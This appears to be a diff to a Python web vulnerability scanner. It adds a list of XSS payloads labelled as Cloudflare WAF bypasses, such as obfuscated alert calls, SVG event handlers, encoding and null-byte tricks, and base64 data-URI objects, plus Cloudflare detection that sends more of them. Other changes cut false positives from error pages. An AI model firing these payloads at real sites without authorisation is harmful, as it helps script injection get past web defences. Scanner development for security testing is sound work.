@@ -138,6 +138,37 @@ _BYPASS_PAYLOADS = {
         "<noscript><img src=x onerror=alert(1)></noscript>",
         "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
     ],
+    "cf_waf": [
+        # Cloudflare managed-rules bypass: uncommon tags + events
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<svg><set onbegin=alert(1) attributename=x to=1>",
+        "<svg><discard onbegin=alert(1)>",
+        # Cloudflare bypass: class-based invocation avoids alert/prompt/confirm signatures
+        "<img src=x onerror=window['al'+'ert'](1)>",
+        "<img src=x onerror=self['al'+'ert'](1)>",
+        "<img src=x onerror=top[/al/.source+/ert/.source](1)>",
+        # Cloudflare bypass: backtick template literals
+        "<svg onload=alert`1`>",
+        "<img src=x onerror=alert`1`>",
+        # Cloudflare bypass: constructor chain (SSTI / template injection crossover)
+        "<img src=x onerror=this.constructor.constructor('alert(1)')()>",
+        # Cloudflare bypass: SVG + use/foreignObject
+        "<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
+        "<svg><foreignObject><body onload=alert(1)>",
+        # Cloudflare bypass: double-URL-encoded (for apps that decode twice)
+        "%253Csvg%2520onload%253Dalert(1)%253E",
+        "%26lt%3Bsvg%20onload%3Dalert(1)%26gt%3B",
+        # Cloudflare bypass: null bytes and unicode normalization
+        "<img src=x onerror\x00=alert(1)>",
+        "<\x00img src=x onerror=alert(1)>",
+        # Cloudflare bypass: event via attribute injection in existing tags
+        "' onfocus=alert(1) autofocus='",
+        "\" onfocus=alert(1) autofocus=\"",
+        '" onmouseover=alert(1) style="position:fixed;width:100%;height:100%" ',
+        # Cloudflare bypass: data URI + base64 in iframe/object
+        "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+        "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
+    ],
 }
 
 # Markers that indicate a bypass payload was rendered rather than escaped
@@ -150,7 +181,13 @@ _BYPASS_MARKERS = {
     "obfuscation": "alert(1)",
     "dom_clobber": "name=innerHTML",
     "mxss": "onerror=",
+    "cf_waf": "alert(1)",
 }
+
+_CF_WAF_MARKERS = re.compile(
+    r'(?:alert\(1\)|alert`1`|alert\x271\x27|'
+    r'onerror\s*=|onload\s*=|onbegin\s*=|onfocus\s*=|onmouseover\s*=)'
+)
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -209,6 +246,30 @@ _POSTMESSAGE_LISTENER = re.compile(r'addEventListener\s*\(\s*["\']message["\']')
 _ORIGIN_CHECK = re.compile(r'\.origin\s*(?:===|!==|==|!=)')
 _WILDCARD_POSTMESSAGE = re.compile(r'\.postMessage\s*\([^)]*,\s*[\"\']?\*[\"\']?\s*\)')
 
+# HTTP status codes that indicate WAF blocks, access denial, or missing resources —
+# reflections in these responses are URL echoes in error pages, not XSS.
+_SKIP_STATUS_CODES = {401, 403, 404, 405, 406, 410, 451}
+
+_ERROR_PAGE_SIGNATURES = re.compile(
+    r'(?:access\s+denied|forbidden|not\s+found|request\s+rejected|'
+    r'web\s+application\s+firewall|waf\s+block|security\s+violation|'
+    r'blocked\s+by|error\s+page|cpanel|whm)',
+    re.IGNORECASE,
+)
+
+
+def _marker_outside_url_echo(body: str, marker: str, payload_url: str) -> bool:
+    """Return True only if *marker* appears in the response body independently
+    of the request URL being echoed verbatim."""
+    p = urlparse(payload_url)
+    url_variants = {payload_url, p.path + ("?" + p.query if p.query else "")}
+    if p.query:
+        url_variants.add(p.query)
+    stripped = body
+    for variant in url_variants:
+        stripped = stripped.replace(variant, "")
+    return marker in stripped
+
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Check 1 — Reflected XSS surface probing
@@ -234,7 +295,7 @@ async def check_reflected_xss(url: str, client: httpx.AsyncClient) -> list[dict]
         except Exception:
             continue
 
-        if resp.status_code > 499:
+        if resp.status_code > 499 or resp.status_code in _SKIP_STATUS_CODES:
             continue
         ct = resp.headers.get("content-type", "")
         if "text/html" not in ct and "text/xml" not in ct:
@@ -243,6 +304,12 @@ async def check_reflected_xss(url: str, client: httpx.AsyncClient) -> list[dict]
             continue
         # Catch-all suppression
         if neg_resp and _CANARY in neg_body:
+            continue
+        # Error page suppression — if the canary only appears inside the echoed URL
+        if not _marker_outside_url_echo(resp.text, _CANARY, probe_url):
+            continue
+        # Generic error page heuristic
+        if resp.status_code >= 400 and _ERROR_PAGE_SIGNATURES.search(resp.text[:2048]):
             continue
 
         # Found reflection — test if tags survive
@@ -254,6 +321,9 @@ async def check_reflected_xss(url: str, client: httpx.AsyncClient) -> list[dict]
             tag_resp = None
 
         if tag_resp and _TAG_CANARY in tag_resp.text and _ESCAPED_TAG not in tag_resp.text:
+            # Require 2xx for confirmed XSS
+            if not (200 <= tag_resp.status_code < 300):
+                continue
             findings.append(_make_finding(
                 url=url,
                 payload_url=probe_url,
@@ -265,10 +335,13 @@ async def check_reflected_xss(url: str, client: httpx.AsyncClient) -> list[dict]
                     f"HTML tags injected via the parameter are rendered verbatim, confirming "
                     f"a reflected cross-site scripting vulnerability."
                 ),
-                http_status=str(resp.status_code),
-                content_length=str(len(resp.content)),
+                http_status=str(tag_resp.status_code),
+                content_length=str(len(tag_resp.content)),
             ))
         else:
+            # Only report potential if response is 2xx
+            if not (200 <= resp.status_code < 300):
+                continue
             findings.append(_make_finding(
                 url=url,
                 payload_url=probe_url,
@@ -311,7 +384,8 @@ async def check_xss_filter_bypass(url: str, client: httpx.AsyncClient) -> list[d
         except Exception:
             continue
 
-        if resp.status_code > 499:
+        # Require 2xx — 4xx/5xx responses echo URLs in error pages, not real reflection
+        if not (200 <= resp.status_code < 300):
             continue
         ct = resp.headers.get("content-type", "")
         if "text/html" not in ct and "text/xml" not in ct:
@@ -319,6 +393,8 @@ async def check_xss_filter_bypass(url: str, client: httpx.AsyncClient) -> list[d
         if _CANARY not in resp.text:
             continue
         if neg_resp and _CANARY in neg_body:
+            continue
+        if not _marker_outside_url_echo(resp.text, _CANARY, probe_url):
             continue
 
         # Canary reflected — check if tags are escaped (filtering is active)
@@ -333,39 +409,60 @@ async def check_xss_filter_bypass(url: str, client: httpx.AsyncClient) -> list[d
             # Tags are not escaped — already a direct XSS, skip bypass testing
             continue
 
+        # Detect Cloudflare — test more CF bypass payloads if present
+        is_cloudflare = any(
+            h in resp.headers.get("server", "").lower()
+            for h in ("cloudflare",)
+        ) or "cf-ray" in resp.headers
+
         # Tags ARE escaped — try bypass categories
         bypasses_found = 0
         for category, payloads in _BYPASS_PAYLOADS.items():
             if bypasses_found >= 3:
                 break
             marker = _BYPASS_MARKERS.get(category, "alert(1)")
-            for payload in payloads[:2]:  # test first 2 payloads per category
+            # Test more CF payloads when Cloudflare is detected
+            max_per_cat = 4 if (category == "cf_waf" and is_cloudflare) else 2
+            for payload in payloads[:max_per_cat]:
                 bypass_path = template.replace("{payload}", payload)
                 bypass_url = origin + bypass_path
                 try:
                     bypass_resp = await client.get(bypass_url)
                 except Exception:
                     continue
-                if bypass_resp.status_code > 499:
+                # Require 2xx for confirmed bypass
+                if not (200 <= bypass_resp.status_code < 300):
                     continue
-                if marker in bypass_resp.text:
-                    findings.append(_make_finding(
-                        url=url,
-                        payload_url=bypass_url,
-                        vulnerability=f"XSS Filter Bypass via {category} ({label})",
-                        status="CRITICAL",
-                        severity="CRITICAL",
-                        details=(
-                            f"Endpoint '{canary_path}' escapes basic HTML tags but a "
-                            f"{category} bypass payload was reflected unescaped. "
-                            f"Bypass marker '{marker}' found in response body. "
-                            f"Payload: {payload!r}"
-                        ),
-                        http_status=str(bypass_resp.status_code),
-                        content_length=str(len(bypass_resp.content)),
-                    ))
-                    bypasses_found += 1
-                    break  # one finding per category
+                # Marker must appear outside the URL echo
+                body_stripped = bypass_resp.text
+                bp = urlparse(bypass_url)
+                for variant in (bypass_url, bp.path + ("?" + bp.query if bp.query else ""), bp.query or ""):
+                    if variant:
+                        body_stripped = body_stripped.replace(variant, "")
+                if category == "cf_waf":
+                    if not _CF_WAF_MARKERS.search(body_stripped):
+                        continue
+                else:
+                    if marker not in body_stripped:
+                        continue
+                findings.append(_make_finding(
+                    url=url,
+                    payload_url=bypass_url,
+                    vulnerability=f"XSS Filter Bypass via {category} ({label})",
+                    status="CRITICAL",
+                    severity="CRITICAL",
+                    details=(
+                        f"Endpoint '{canary_path}' escapes basic HTML tags but a "
+                        f"{category} bypass payload was reflected unescaped. "
+                        f"{'Cloudflare WAF bypass: ' if category == 'cf_waf' else ''}"
+                        f"Bypass marker found in response body. "
+                        f"Payload: {payload!r}"
+                    ),
+                    http_status=str(bypass_resp.status_code),
+                    content_length=str(len(bypass_resp.content)),
+                ))
+                bypasses_found += 1
+                break  # one finding per category
 
     return findings
 
@@ -393,9 +490,12 @@ async def check_stored_xss_surfaces(url: str, client: httpx.AsyncClient) -> list
 
         if resp.status_code != 200:
             continue
-        # Catch-all suppression
-        if neg_resp and neg_resp.status_code == 200 and resp.text == neg_resp.text:
-            continue
+        # Catch-all suppression — use structural similarity (ignore CSRF tokens etc.)
+        if neg_resp and neg_resp.status_code == 200:
+            neg_stripped = re.sub(r'content="[^"]{8,}"', 'content="X"', neg_resp.text)
+            resp_stripped = re.sub(r'content="[^"]{8,}"', 'content="X"', resp.text)
+            if neg_stripped == resp_stripped:
+                continue
 
         ct = resp.headers.get("content-type", "")
         disposition = resp.headers.get("content-disposition", "")
@@ -403,8 +503,8 @@ async def check_stored_xss_surfaces(url: str, client: httpx.AsyncClient) -> list
         body_lower = resp.text[:4096].lower()
 
         has_listing = any(m in body_lower for m in (
-            "index of", "<a href=", "directory listing", "parent directory",
-            "[dir]", "<pre>", "last modified",
+            "index of", "directory listing", "parent directory",
+            "[dir]", "last modified",
         ))
         if not has_listing:
             continue
